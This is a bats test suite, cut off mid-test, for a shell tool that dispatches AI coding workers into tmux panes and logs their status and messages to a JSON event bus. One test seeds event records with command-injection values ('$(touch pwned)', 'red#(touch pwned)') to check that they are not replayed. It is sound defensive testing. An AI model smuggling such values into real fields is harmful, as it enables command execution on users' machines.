bats_require_minimum_version 1.5.0 # `run --separate-stderr`

setup() {
  load helpers
  CREW="$BATS_TEST_DIRNAME/../adapters/core/crew.sh"
  run_crew() { bash -euo pipefail "$CREW" "$@"; }
  setup_repo
  # A dispatch records it before any worker exists; reap never does (#557).
  seed_git_baseline
  unset CREW_ID
  # Absent unless a test sets it, so pane-recording stays deterministic
  # regardless of whether bats itself runs inside a tmux pane.
  unset TMUX_PANE
  # No engine process by default, so quiet:->dead: escalation stays
  # deterministic regardless of what runs on the host tmux server.
  export CREW_STALL_PROC_CMD='printf ""'
  # await, the hold paths and stall-watch run on a virtual clock: their waits
  # advance this file instead of sleeping.
  export CREW_CLOCK="$BATS_TEST_TMPDIR/clock"
  # Table-driven rows restore this before each row's stubs.
  _ROW_BASE_PATH="$PATH"
  # The real refresh-budget probes live accounts, which no test may do.
  export CREW_BUDGET_REFRESH_CMD=:
}

teardown() {
  # Before teardown_repo: a leaked `crew stream` (and the `crew watch` it owns)
  # would race its rm -rf. See the stream harness at the bottom of this file.
  stop_stream
  if [ -n "${HOLDER_PID:-}" ]; then
    kill -KILL "$HOLDER_PID" 2>/dev/null || true
  fi
  # A test that leaves a read-only dir names it here, so bats can delete it.
  if [ -n "${RESTORE_WRITE:-}" ]; then
    chmod -R u+w "$RESTORE_WRITE" 2>/dev/null || true
  fi
  teardown_repo
}

# Table-driven rows share one bats test, so each row re-seeds the fixture
# setup() built. stub_bin/stub_tmux memoize STUB_DIR (helpers.bash), and
# teardown_repo only removes the last $TEST_REPO.
_reset_row_fixture() { # <id>
  local id="$1" stub log stub_path
  stub="$BATS_TEST_TMPDIR/row-stub-dir"
  if [ -f "$stub" ]; then
    stub_path="$(cat "$stub")"
    rm -rf "$stub_path"
    rm -f "$stub"
  fi
  if [ -n "${STUB_DIR:-}" ] && [ -d "$STUB_DIR" ]; then
    rm -rf "$STUB_DIR"
  fi
  export PATH="$_ROW_BASE_PATH"
  unset STUB_DIR STUB_LOG
  export XDG_DATA_HOME="$BATS_TEST_TMPDIR/data-$id"
  assert_isolated_xdg_data_home
  log="$(git -C "$TEST_REPO" rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  rm -f "$log"
  rm -f "$TEST_REPO/WORKER_TASK.md"
}

_note_row_stub() {
  if [ -n "${STUB_DIR:-}" ]; then
    printf '%s\n' "$STUB_DIR" >"$BATS_TEST_TMPDIR/row-stub-dir"
  fi
}

# Real tmux pane_current_path is kernel-canonical (pwd -P); git worktree paths
# resolve symlinks too (/var → /private/var on macOS) but $BATS_TEST_TMPDIR does
# not — canonicalize existing dirs in fixture text so absence-of-release tests
# can fail when occupancy silently misses (#52).
_canon_stub_path() {
  if [ -d "$1" ]; then
    (cd "$1" && pwd -P)
  else
    printf '%s' "$1"
  fi
}

_canon_stub_wins_body() {
  local body="$1"
  [ -n "$body" ] || return 0
  local line f1 f2 f3 rest
  while IFS= read -r line || [ -n "$line" ]; do
    if [ -z "$line" ]; then
      printf '\n'
      continue
    fi
    IFS=$'\t' read -r f1 f2 f3 rest <<< "$line"
    if [ -n "$f3" ]; then
      f3="$(_canon_stub_path "$f3")"
    fi
    printf '%s\t%s\t%s' "$f1" "$f2" "$f3"
    [ -n "$rest" ] && printf '\t%s' "$rest"
    printf '\n'
  done <<< "$body"
}

_canon_stub_panes_body() {
  local body="$1"
  [ -n "$body" ] || return 0
  local line cmd path
  while IFS= read -r line || [ -n "$line" ]; do
    if [ -z "$line" ]; then
      printf '\n'
      continue
    fi
    if [[ "$line" == *$'\t'* ]]; then
      printf '%s\n' "$line"
      continue
    fi
    cmd="${line%% *}"
    path="${line#* }"
    if [ "$path" != "$line" ] && [ -n "$path" ]; then
      path="$(_canon_stub_path "$path")"
      printf '%s %s\n' "$cmd" "$path"
    else
      printf '%s\n' "$line"
    fi
  done <<< "$body"
}

# stub_tmux <list-windows-body> <list-panes-body> — a tmux whose list output is
# fixed text. crew's real tmux calls are `|| true`-tolerant, so without this the
# occupancy tests would read the developer's live server and flake.
stub_tmux() {
  STUB_DIR="${STUB_DIR:-$(mktemp -d)}"
  STUB_LOG="${STUB_LOG:-$STUB_DIR/calls.log}"
  _canon_stub_wins_body "$1" >"$STUB_DIR/wins.txt"
  _canon_stub_panes_body "$2" >"$STUB_DIR/panes.txt"
  cat >"$STUB_DIR/tmux" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$1" in
list-windows)
  case "$*" in
  *window_activity*) [ -f "$STUB_DIR/human.txt" ] && cat "$STUB_DIR/human.txt" ;;
  *) cat "$STUB_DIR/wins.txt" ;;
  esac
  ;;
list-panes) cat "$STUB_DIR/panes.txt" ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/tmux"
  export STUB_DIR STUB_LOG
  export PATH="$STUB_DIR:$PATH"
}

# stub_tmux_frames <wins-body> <panes4-body> [panes3-body] — a tmux stub for
# reap's reclaim pass: `list-panes` answers the new 4-field
# `window\tpane\tcmd\tpath` query with <panes4-body> (detected by
# `pane_current_path` + `window_id` both appearing in the -F format) and the
# legacy 3-field occupancy query (`_occupants`) with <panes3-body> otherwise.
# `list-windows -F …@crew_branch…` (the orphan-window report, run on every
# reap) answers from `$STUB_DIR/wins3.txt` if the test wrote one, else empty —
# most tests have no orphan to report. `capture-pane -t <pane>` answers from
# `$STUB_DIR/frames/<pane>` if the test wrote one, else empty (no capture);
# with `-e` (colored) it prefers `frames/<pane>.e`. The Nth plain capture of a
# pane answers from `frames/<pane>.<N>` when that exists, and runs
# `frames/<pane>.<N>.hook` first when that exists — how a test changes the
# pane, or the bus, between reap's two samples.
stub_tmux_frames() {
  STUB_DIR="${STUB_DIR:-$(mktemp -d)}"
  STUB_LOG="${STUB_LOG:-$STUB_DIR/calls.log}"
  mkdir -p "$STUB_DIR/frames"
  _canon_stub_wins_body "$1" >"$STUB_DIR/wins.txt"
  _canon_stub_panes_body "$2" >"$STUB_DIR/panes4.txt"
  _canon_stub_panes_body "${3:-}" >"$STUB_DIR/panes.txt"
  cat >"$STUB_DIR/tmux" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$1" in
list-windows)
  case "$*" in
  *window_activity*) [ -f "$STUB_DIR/human.txt" ] && cat "$STUB_DIR/human.txt" ;;
  *@crew_branch*) [ -f "$STUB_DIR/wins3.txt" ] && cat "$STUB_DIR/wins3.txt" ;;
  *) cat "$STUB_DIR/wins.txt" ;;
  esac
  ;;
list-panes)
  case "$*" in
  *pane_current_path*window_id* | *window_id*pane_current_path*) cat "$STUB_DIR/panes4.txt" ;;
  *) cat "$STUB_DIR/panes.txt" ;;
  esac
  ;;
capture-pane)
  pane=""
  prev=""
  for a in "$@"; do
    [ "$prev" = "-t" ] && pane="$a"
    prev="$a"
  done
  f="$STUB_DIR/frames/$pane"
  case " $* " in
  *" -e "*)
    [ -f "$f.e" ] && f="$f.e"
    ;;
  *)
    n=$(($(cat "$f.n" 2>/dev/null || echo 0) + 1))
    echo "$n" >"$f.n"
    [ -x "$f.$n.hook" ] && "$f.$n.hook"
    [ -f "$f.$n" ] && f="$f.$n"
    ;;
  esac
  [ -f "$f" ] && cat "$f"
  ;;
display-message) : ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/tmux"
  export STUB_DIR STUB_LOG
  export PATH="$STUB_DIR:$PATH"
}

# set_frame <pane-id> — write a capture-pane frame (stdin) for stub_tmux_frames.
set_frame() {
  mkdir -p "$STUB_DIR/frames"
  cat >"$STUB_DIR/frames/$1"
}

# anchor_record_path <wt> — the dispatcher anchor record path for <wt>, as the
# shared worktree-git lib derives it (#556).
anchor_record_path() {
  printf '%s/crew/worktrees/%s\n' "$XDG_DATA_HOME" \
    "$(printf %s "$(realpath -e "$1")" | sha256sum | cut -c1-64)"
}

# write_anchor_record <wt> — plant the record `dispatch` would have written for
# a worktree, so reap has something to prune.
write_anchor_record() {
  local path
  path="$(anchor_record_path "$1")"
  mkdir -p "$(dirname "$path")"
  printf 'record\n' >"$path"
}

@test "id: honours CREW_ID when set" {
  CREW_ID=1720800000-12345 run run_crew id
  [ "$status" -eq 0 ]
  [ "$output" = "1720800000-12345" ]
}

@test "identity: is deterministic over the branch" {
  run run_crew identity feat/foo
  [ "$status" -eq 0 ]
  first="$output"
  run run_crew identity feat/foo
  [ "$output" = "$first" ]
}

@test "identity: emits name, color and tmux keys" {
  run run_crew identity feat/foo
  [ "$status" -eq 0 ]
  echo "$output" | jq -e 'has("name") and has("color") and has("tmux")'
}

@test "identity: two live branches on one hash slot get different codenames" {
  a=feat/33-thing
  b=feat/38-thing
  [ "$(run_crew identity $a | jq -r .name)" = "$(run_crew identity $b | jq -r .name)" ]
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  ida="$(run_crew identity $a c1)"
  jq -nc --argjson i "$ida" '{ts:1,crew_id:"c1",kind:"dispatch",branch:"feat/33-thing"} + $i' >>"$dir/events.jsonl"
  idb="$(run_crew identity $b c1)"
  [ "$(echo "$ida" | jq -r .name)" != "$(echo "$idb" | jq -r .name)" ]
  [ "$(echo "$ida" | jq -r .tmux)" != "$(echo "$idb" | jq -r .tmux)" ]
}

@test "identity: a branch keeps its recorded identity, and a finished worker frees its slot" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  printf '%s\n' '{"ts":1,"crew_id":"c1","kind":"dispatch","branch":"feat/33-thing","name":"nova","color":"magenta","tmux":"colour127"}' >>"$dir/events.jsonl"
  [ "$(run_crew identity feat/33-thing c1 | jq -r .name)" = "nova" ]
  # 38 hashes to sage; a finished sage-holder must not push it forward.
  printf '%s\n' '{"ts":2,"crew_id":"c1","kind":"dispatch","branch":"feat/9-x","name":"sage","color":"green","tmux":"colour28"}' >>"$dir/events.jsonl"
  CREW_ID=c1 run_crew status "worker:feat/9-x#s1-1" working
  [ "$(run_crew identity feat/38-thing c1 | jq -r .name)" != "sage" ]
  CREW_ID=c1 run_crew status "worker:feat/9-x#s1-1" done
  [ "$(run_crew identity feat/38-thing c1 | jq -r .name)" = "sage" ]
}

@test "identity: a recorded name or colour outside the codename grammar is not replayed (#470)" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  printf '%s\n' '{"ts":1,"crew_id":"c1","kind":"dispatch","branch":"feat/33-thing","name":"$(touch pwned)","color":"green","tmux":"colour28"}' >>"$dir/events.jsonl"
  printf '%s\n' '{"ts":2,"crew_id":"c1","kind":"dispatch","branch":"feat/34-thing","name":"nova","color":"green","tmux":"red#(touch pwned)"}' >>"$dir/events.jsonl"
  printf '%s\n' '{"ts":3,"crew_id":"c1","kind":"dispatch","branch":"feat/35-thing","name":"nova\n","color":"green","tmux":"colour28"}' >>"$dir/events.jsonl"
  for b in feat/33-thing feat/34-thing feat/35-thing; do
    id="$(run_crew identity "$b" c1)"
    [ "$(jq -r .name <<<"$id")" != $'nova\n' ]
    [[ "$(jq -r .name <<<"$id")" =~ ^[a-z]+$ ]]
    [[ "$(jq -r .tmux <<<"$id")" =~ ^colour[0-9]+$ ]]
  done
}

@test "roster: shows the recorded codename without a suffix" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  printf '%s\n' '{"ts":1,"crew_id":"c1","kind":"dispatch","branch":"feat/33-thing","name":"sage","color":"green","tmux":"colour28"}' >>"$dir/events.jsonl"
  printf '%s\n' '{"ts":2,"crew_id":"c1","kind":"dispatch","branch":"feat/38-thing","name":"atlas","color":"blue","tmux":"colour32"}' >>"$dir/events.jsonl"
  CREW_ID=c1 run_crew status "worker:feat/33-thing#s1-1" working
  CREW_ID=c1 run_crew status "worker:feat/38-thing#s1-1" working
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '[.[].name] | sort | join(",")')" = "atlas,sage" ]
}

@test "repo-keyed subcommands refuse to run outside a git repo" {
  cd /
  CREW_ID=c1 run run_crew status worker working
  [ "$status" -eq 1 ]
  [[ "$output" == *"not in a git repo"* ]]
}

@test "status: rejects an unknown state" {
  CREW_ID=c1 run run_crew status worker bogus
  [ "$status" -eq 1 ]
  [[ "$output" == *"status state must be one of"* ]]
}

@test "status: accepts every documented state" {
  for s in working blocked pr_open done failed exited; do
    CREW_ID=c1 run run_crew status "worker-$s" "$s"
    [ "$status" -eq 0 ]
  done
}

@test "status: a worker's status lands on its lead pane" {
  stub_bin tmux
  cat >"$STUB_DIR/tmux" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$1" in
display-message) printf '%s\n' 'lead' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/tmux"
  export TMUX_PANE=%9
  CREW_ID=c1 run run_crew status "worker:feat/x#s1-1" blocked "waiting on #273"
  [ "$status" -eq 0 ]
  run grep -F -- 'set-option -p -t %9 @crew_state blocked' "$STUB_LOG"
  [ "$status" -eq 0 ]
  run grep -F -- 'set-option -p -t %9 @crew_detail waiting on #273' "$STUB_LOG"
  [ "$status" -eq 0 ]
  run grep -F -- 'set-option -p -t %9 @crew_source ' "$STUB_LOG"
  [ "$status" -eq 0 ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.state'"
  [ "$output" = blocked ]
}

@test "status: the lead pane detail is truncated to 40 characters" {
  stub_bin tmux
  cat >"$STUB_DIR/tmux" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$1" in
display-message) printf '%s\n' 'lead' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/tmux"
  export TMUX_PANE=%9
  long="$(printf 'x%.0s' {1..80})"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working "$long"
  run grep -oF -- "set-option -p -t %9 @crew_detail $(printf 'x%.0s' {1..40})" "$STUB_LOG"
  [ "$status" -eq 0 ]
  run ! grep -qF "$(printf 'x%.0s' {1..41})" "$STUB_LOG"
}

@test "status: a role pane's post never touches the lead pane" {
  stub_bin tmux
  cat >"$STUB_DIR/tmux" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$1" in
display-message) printf '%s\n' 'reviewer' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/tmux"
  export TMUX_PANE=%9 CREW_ROLE_ID=role:feat/x:reviewer
  CREW_ID=c1 run run_crew status "role:feat/x:reviewer" working
  [ "$status" -eq 0 ]
  run ! grep -q '@crew_state' "$STUB_LOG"
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.state'"
  [ "$output" = working ]
}

@test "status: outside tmux the pane publish is a silent no-op" {
  unset TMUX_PANE
  CREW_ID=c1 run run_crew status "worker:feat/x#s1-1" working plan
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  run bash -c "bus | jq -r 'select(.kind==\"status\") | .body.detail'"
  [ "$output" = plan ]
}

@test "status: a repeated terminal state is written once" {
  CREW_ID=c1 run_crew status worker done
  CREW_ID=c1 run_crew status worker done
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run grep -c '"state":"done"' "$log"
  [ "$output" = "1" ]
}

@test "status: a repeated non-terminal state is NOT deduped" {
  CREW_ID=c1 run_crew status worker working
  CREW_ID=c1 run_crew status worker working
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run grep -c '"state":"working"' "$log"
  [ "$output" = "2" ]
}

@test "status: is addressed to the crew dispatcher" {
  CREW_ID=c1 run_crew status worker working
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="status") | .to' "$log"
  [ "$output" = "dispatcher:c1" ]
}

@test "status: fails when no crew id can be resolved" {
  CREW_ID= run run_crew status worker working
  [ "$status" -eq 1 ]
  [[ "$output" == *"CREW_ID unset"* ]]
}

@test "crew id resolves from WORKER_TASK.md when CREW_ID is unset" {
  printf 'crew_id: c-from-file\n' >WORKER_TASK.md
  CREW_ID= run_crew status worker working
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r '.crew_id' "$log"
  [ "$output" = "c-from-file" ]
}

@test "msg: records from, to and body verbatim" {
  CREW_ID=c1 run_crew msg alice bob "ship it"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="msg") | "\(.from)|\(.to)|\(.body)"' "$log"
  [ "$output" = "alice|bob|ship it" ]
}

# F04: folded family — msg rejects an empty id after dispatcher:/worker:/retro:.
# #46: a shell expanding an unset $CREW_ID into "dispatcher:$CREW_ID" leaves
# a bare trailing colon — msg must fail loudly instead of logging it.
# The worker: row's from is dispatcher:c1; only from and to change.
@test "msg: rejects a recipient prefix with an empty id" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label from to expect rc
  while IFS='|' read -r label from to expect <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      CREW_ID=c1 run run_crew msg "$from" "$to" "hi"
      [ "$status" -eq 1 ]
      [[ "$output" == *"$expect"* ]]
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
msg: rejects dispatcher: with an empty id|worker|dispatcher:|missing an id after the colon
msg: rejects worker: with an empty id|dispatcher:c1|worker:|missing an id after the colon
msg: rejects retro: with an empty id|worker|retro:|missing an id after the colon
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "msg: still accepts every currently-valid recipient shape" {
  for to in bob 'worker:feat/1' 'worker:feat/1#s1-1' 'dispatcher:c1' 'retro:c1' 'metrics:c1' '*'; do
    CREW_ID=c1 run run_crew msg worker "$to" "hi"
    [ "$status" -eq 0 ]
  done
}

@test "status: an oversized detail is clipped so the line stays one atomic write" {
  big="$(head -c 8192 /dev/zero | tr '\0' x)"
  CREW_ID=c1 run_crew status worker failed "$big"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  line_bytes="$(printf '%s' "$(head -1 "$log")" | wc -c | tr -d ' ')"
  [ "$line_bytes" -le 4096 ]
  run jq -e '.body.state == "failed" and (.body.detail | endswith("[elided]"))' "$log"
  [ "$status" -eq 0 ]
}

@test "msg: an oversized body is clipped so the line stays one atomic write" {
  big="$(head -c 8192 /dev/zero | tr '\0' x)"
  CREW_ID=c1 run_crew msg alice bob "$big"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  line_bytes="$(printf '%s' "$(head -1 "$log")" | wc -c | tr -d ' ')"
  [ "$line_bytes" -le 4096 ]
  run jq -e '.from == "alice" and .to == "bob" and (.body | endswith("[elided]"))' "$log"
  [ "$status" -eq 0 ]
}

@test "status: quote-heavy text still fits (JSON escaping is nonlinear)" {
  big="$(head -c 4000 /dev/zero | tr '\0' '"')"
  CREW_ID=c1 run_crew status worker failed "$big"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  line_bytes="$(printf '%s' "$(head -1 "$log")" | wc -c | tr -d ' ')"
  [ "$line_bytes" -le 4096 ]
  run jq -e . "$log"
  [ "$status" -eq 0 ]
}

@test "bus: concurrent oversized writes never splice two records into one line" {
  big="$(head -c 8192 /dev/zero | tr '\0' x)"
  for i in 1 2 3 4 5 6 7 8; do
    (
      for _ in 1 2 3 4 5; do
        CREW_ID=c1 bash -euo pipefail "$CREW" status "worker:b$i" working "$big"
      done
    ) &
  done
  wait
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  [ "$(wc -l <"$log" | tr -d ' ')" -eq 40 ]
  while IFS= read -r l; do
    printf '%s' "$l" | jq -e . >/dev/null
  done <"$log"
  # A line count alone cannot see a splice: each append contributes exactly one
  # newline either way, so assert one record per line too.
  [ "$(grep -o '{"ts"' "$log" | wc -l | tr -d ' ')" -eq 40 ]
}

@test "bus: concurrent reply appends never splice (#61's converted site)" {
  # Same shape as the "concurrent oversized writes" test above, but through
  # `reply` — one of the five sites #61 converted to _bus_append. `reply`
  # doesn't need a live session to target as long as `to` isn't `worker:*`
  # (that prefix triggers session resolution this test isn't exercising).
  # 4002 x's lands the finished line (with trailing newline) at 4097 bytes —
  # one byte over `_LINE_MAX`, too small for `_fit_line`'s shrink loop to ever
  # engage (it measures the line *without* the newline `_bus_append` adds, so
  # it sees 4096 and calls that done) but enough to force bash's `printf`
  # builtin to split the write into two syscalls (4096 + 1) instead of one —
  # exactly the multi-write window `_bus_append`'s `dd` closes.
  big="$(head -c 4002 /dev/zero | tr '\0' x)"
  for i in 1 2 3 4 5 6 7 8; do
    (
      for _ in 1 2 3 4 5; do
        CREW_ID=c1 bash -euo pipefail "$CREW" reply "peer$i" "$big"
      done
    ) &
  done
  wait
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  [ "$(wc -l <"$log" | tr -d ' ')" -eq 40 ]
  while IFS= read -r l; do
    printf '%s' "$l" | jq -e . >/dev/null
  done <"$log"
  [ "$(grep -o '{"ts"' "$log" | wc -l | tr -d ' ')" -eq 40 ]
}

# #391: a hard kill mid-append leaves a trailing line with no newline; the next
# `_bus_append` must start on a fresh line instead of gluing a whole valid
# record onto the torn fragment, which a reader would lose as one unparsable
# line. The new record must be readable as its own row after the fragment.
@test "bus: an append after a crash-torn trailing line starts on a fresh line" {
  id="worker:feat/x#s1-1"
  CREW_ID=c1 run_crew status "$id" working
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  # The crash-torn fragment, with no trailing newline.
  printf '{"ts":1785951264000,"crew_id":"c-to' >>"$log"
  CREW_ID=c1 run_crew msg "$id" "dispatcher:c1" "hello"
  # The torn fragment stays its own line — never spliced with the new record.
  [ "$(sed -n '2p' "$log")" = '{"ts":1785951264000,"crew_id":"c-to' ]
  # The new record starts its own line and parses.
  printf '%s' "$(sed -n '3p' "$log")" | jq -e '.kind=="msg" and .from=="worker:feat/x#s1-1" and .body=="hello"' >/dev/null
  [ "$(wc -l <"$log" | tr -d ' ')" -eq 3 ]
}

@test "register: is idempotent for the same pid" {
  CREW_ID=c1 run run_crew register $$
  [ "$status" -eq 0 ]
  CREW_ID=c1 run run_crew register $$
  [ "$status" -eq 0 ]
}

@test "register: is non-exclusive across crews" {
  CREW_ID=c1 run run_crew register $$
  [ "$status" -eq 0 ]
  CREW_ID=c2 run run_crew register $$
  [ "$status" -eq 0 ]
}

@test "register records the dispatcher pane when in tmux" {
  cdir="$(git rev-parse --path-format=absolute --git-common-dir)/crew/crews/c1"
  CREW_ID=c1 TMUX_PANE='%12' run_crew register 4242
  [ "$(cat "$cdir/pid")" = 4242 ]
  [ "$(cat "$cdir/pane")" = '%12' ]
}

@test "register writes no pane file outside tmux" {
  cdir="$(git rev-parse --path-format=absolute --git-common-dir)/crew/crews/c1"
  CREW_ID=c1 run_crew register 4242
  [ -f "$cdir/pid" ]
  [ ! -f "$cdir/pane" ]
}

@test "deregister removes the pane file with the crew dir" {
  cdir="$(git rev-parse --path-format=absolute --git-common-dir)/crew/crews/c1"
  (exit 0) & dead_pid=$!
  wait "$dead_pid" 2>/dev/null || true
  CREW_ID=c1 TMUX_PANE='%12' run_crew register "$dead_pid"
  CREW_ID=c1 run_crew deregister
  [ ! -e "$cdir" ]
}

@test "inbox: does not deliver a metrics-addressed message to the dispatcher" {
  CREW_ID=c1 run_crew msg worker "metrics:c1" '{"tier":"deep"}'
  CREW_ID=c1 run run_crew inbox "dispatcher:c1"
  [ "$status" -eq 0 ]
  [[ "$output" != *"deep"* ]]
}

@test "rate: projects replanned booleans and legacy null while retaining rework count" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  cat >"$log" <<'EOF'
{"ts":1000,"crew_id":"c1","kind":"dispatch","branch":"feat/replan-true","engine":"claude","model":"sonnet","tier":"standard","effort":"medium","title":"replans"}
{"ts":1001,"crew_id":"c1","kind":"status","from":"worker:feat/replan-true","body":{"state":"done"}}
{"ts":1002,"crew_id":"c1","kind":"msg","from":"worker:feat/replan-true","to":"metrics:c1","body":"{\"replanned\":true,\"rework_count\":3}"}
{"ts":2000,"crew_id":"c1","kind":"dispatch","branch":"feat/replan-false","engine":"claude","model":"sonnet","tier":"standard","effort":"medium","title":"does not replan"}
{"ts":2001,"crew_id":"c1","kind":"status","from":"worker:feat/replan-false","body":{"state":"done"}}
{"ts":2002,"crew_id":"c1","kind":"msg","from":"worker:feat/replan-false","to":"metrics:c1","body":"{\"replanned\":false,\"rework_count\":1}"}
{"ts":3000,"crew_id":"c1","kind":"dispatch","branch":"feat/replan-legacy","engine":"claude","model":"sonnet","tier":"standard","effort":"medium","title":"legacy metrics"}
{"ts":3001,"crew_id":"c1","kind":"status","from":"worker:feat/replan-legacy","body":{"state":"done"}}
{"ts":3002,"crew_id":"c1","kind":"msg","from":"worker:feat/replan-legacy","to":"metrics:c1","body":"{\"rework_count\":2}"}
EOF
  export XDG_DATA_HOME="$BATS_TEST_TMPDIR/data"

  run run_crew rate
  [ "$status" -eq 0 ]

  run jq -s -e '
    map({branch, replanned, rework_count, replanned_present: has("replanned")})
    | sort_by(.branch) == [
        {branch:"feat/replan-false", replanned:false, rework_count:1, replanned_present:true},
        {branch:"feat/replan-legacy", replanned:null, rework_count:2, replanned_present:true},
        {branch:"feat/replan-true", replanned:true, rework_count:3, replanned_present:true}
      ]
  ' "$XDG_DATA_HOME/crew/ratings.jsonl"
  [ "$status" -eq 0 ]
}

@test "reap: rejects an unknown flag" {
  CREW_ID=c1 run run_crew reap --bogus
  [ "$status" -eq 1 ]
  [[ "$output" == *"reap takes --quiet, --dry-run, --no-wait and --idle S"* ]]
}

@test "reap: is a no-op when the bus has no events" {
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
}

@test "reap: --dry-run removes no worktree" {
  # A candidate only enters reap's sweep when `from` carries the real
  # `worker:<branch>` convention (WORKER_PROTOCOL.md: `n worker:<branch> done`)
  # AND a worktree for that branch actually exists AND its PR reads back as
  # merged/closed — a bare `status worker done` (no prefix, no worktree, no
  # PR) is filtered out before reap ever calls gh or wt, so the stub log is
  # never created and the original assertion errors on a missing file rather
  # than proving anything about --dry-run. Wire up a real candidate so the
  # test exercises the actual dry-run gate.
  git commit -q --allow-empty -m init
  git branch feat/reap-me
  wt_path="$BATS_TEST_TMPDIR/reap-me-wt"
  git worktree add -q "$wt_path" feat/reap-me
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
echo MERGED
exit 0
EOF
  stub_bin wt
  CREW_ID=c1 run_crew status "worker:feat/reap-me" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap --dry-run
  [ "$status" -eq 0 ]
  [[ "$output" == *"would reap feat/reap-me"* ]]
  run grep -c 'remove' "$STUB_LOG"
  [ "$output" = "0" ]
}

@test "occupants: reports a worker window with a live engine" {
  stub_tmux "$(printf '@23\tsage\t/wt/a\n@9\t\t/wt/a\n')" "$(printf '@23\t%%33\tclaude\n')"
  run run_crew occupants /wt/a
  [ "$status" -eq 0 ]
  [ "$(echo "$output" | jq -r 'length')" = "1" ]
  [ "$(echo "$output" | jq -r '.[0].window')" = "@23" ]
  [ "$(echo "$output" | jq -r '.[0].name')" = "sage" ]
  [ "$(echo "$output" | jq -r '.[0].pane')" = "%33" ]
  [ "$(echo "$output" | jq -r '.[0].engine')" = "true" ]
}

# F06: folded family — a known engine pane command is an engine.
# Measured on a live Nix pane (`tmux display -p '#{pane_current_command}'` on a
# running codex worker): unlike claude/cursor-agent, codex's Nix wrapper
# re-execs under its own literal name, so no wrapper-strip is needed for it.
@test "occupants: a known engine pane command is an engine" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label cmd rc
  while IFS='|' read -r label cmd <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    stub_tmux "$(printf '@1\tsage\t/wt/a\n')" "$(printf '@1\t%%1\t%s\n' "$cmd")"
    set +e
    (
      set -e
      run run_crew occupants /wt/a
      [ "$status" -eq 0 ]
      [ "$(echo "$output" | jq -r '.[0].engine')" = "true" ]
      [ "$(echo "$output" | jq -r '.[0].pane')" = "%1" ]
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
occupants: a nix-wrapped claude pane is an engine|.claude-wrapped
occupants: a cursor-agent pane reports node and is an engine|node
occupants: a codex pane reports its own literal name and is an engine|codex
occupants: a pi pane reports its own literal name and is an engine|pi
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
